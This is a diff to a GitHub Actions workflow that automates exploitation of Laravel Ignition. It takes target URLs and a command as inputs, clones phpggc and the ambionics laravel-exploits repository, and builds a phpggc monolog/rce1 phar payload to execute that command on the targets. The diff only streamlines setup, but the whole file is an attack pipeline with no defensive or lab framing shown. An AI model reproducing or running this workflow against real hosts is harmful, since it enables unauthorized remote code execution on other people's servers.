@@ -4,7 +4,7 @@ on:
   workflow_dispatch:
     inputs:
       urls:
-        description: 'URLs separated by spaces, commas, or mashed together'
+        description: 'URLs separated by spaces, commas, or mashed together (Just base URL, e.g., http://x.com/)'
         required: true
         type: string
       command:
@@ -24,23 +24,14 @@ jobs:
 
       - name: Install Dependencies
         run: |
-          sudo apt-get update && sudo apt-get install -y jq zip php-cli php-gd php-mbstring php-xml php-curl unzip
+          sudo apt-get update && sudo apt-get install -y jq zip php-cli php-gd php-mbstring php-xml php-curl
           pip3 install requests pycryptodome bs4
 
-      - name: Setup Composer & phpggc
+      - name: Clone Repositories
         run: |
-          # Install Composer
-          curl -sS https://getcomposer.org/installer | sudo php -- --install-dir=/usr/local/bin --filename=composer
-          
-          # Clone phpggc and install its dependencies
-          git clone https://github.com/ambionics/phpggc.git
-          cd phpggc
-          composer install --no-interaction
-          cd ..
-
-      - name: Clone Laravel Exploit Repository
-        run: |
+          git clone https://github.com/ambionics/phpggc.git || true
           git clone https://github.com/ambionics/laravel-exploits.git || true
+          
           if [ ! -f "laravel-exploits/laravel-ignition-rce.py" ]; then
             echo "ERROR: laravel-ignition-rce.py not found!"
             exit 1
@@ -52,6 +43,7 @@ jobs:
         run: |
           echo ">>> Generating exploit.phar for command: ${CMD_INPUT}"
           # Generate the payload using phpggc (monolog/rce1 is standard for Laravel Ignition)
+          # phpggc runs natively without needing composer
           php -d "phar.readonly=0" ./phpggc/phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system "$CMD_INPUT" || true
           
           if [ ! -f "/tmp/exploit.phar" ]; then
